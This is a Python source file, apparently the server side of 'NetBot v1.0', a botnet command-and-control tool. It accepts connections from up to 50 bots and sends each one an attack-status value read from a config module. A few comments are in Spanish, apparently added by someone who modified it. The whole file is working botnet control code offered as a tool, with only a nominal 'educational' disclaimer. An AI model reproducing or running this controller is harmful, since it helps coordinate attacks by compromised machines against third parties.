#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author	 : Shankar Narayana Damodaran
# Tool 		 : NetBot v1.0
# 
# Description	 : This is a command & control center client-server code.
#              		Should be used for educational, research purposes and internal use only.
#



import socket
import threading
from termcolor import colored
from importlib import reload

print("arrancamos")


def config():
	import config
	config = reload(config)
	return config.ATTACK_STATUS
	 

def threaded(c):
    try:
        while True:
            data = c.recv(1024)
            if not data:
                break
            c.send(config().encode())
    except Exception as e:
        print(f"Error en thread: {e}")
    finally:
        global connected
        connected -= 1
        try:
            print('\x1b[0;30;41m' + ' client went Offline! ' + '\x1b[0m','Disconnected from server :', c.getpeername()[0], ':', c.getpeername()[1], '\x1b[6;30;43m' + ' Total clients Connected:', connected,  '\x1b[0m')
        except:
            pass
        c.close()  


def Main():
    host = "0.0.0.0"
    port = 5555
    global connected
    connected = 0

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # ← AÑADE ESTA LÍNEA
    s.bind((host, port))
    s.listen(50)
    
    try:
        while True:
            c, addr = s.accept()
            connected = connected + 1
            print('\x1b[0;30;42m' + ' client is now Online! ' + '\x1b[0m','Connected to server :', addr[0], ':', addr[1], '\x1b[6;30;43m' + ' Total clients Connected:', connected,  '\x1b[0m')
            threading.Thread(target=threaded, args=(c,)).start()
    finally:
        s.close()


if __name__ == '__main__':
	Main()
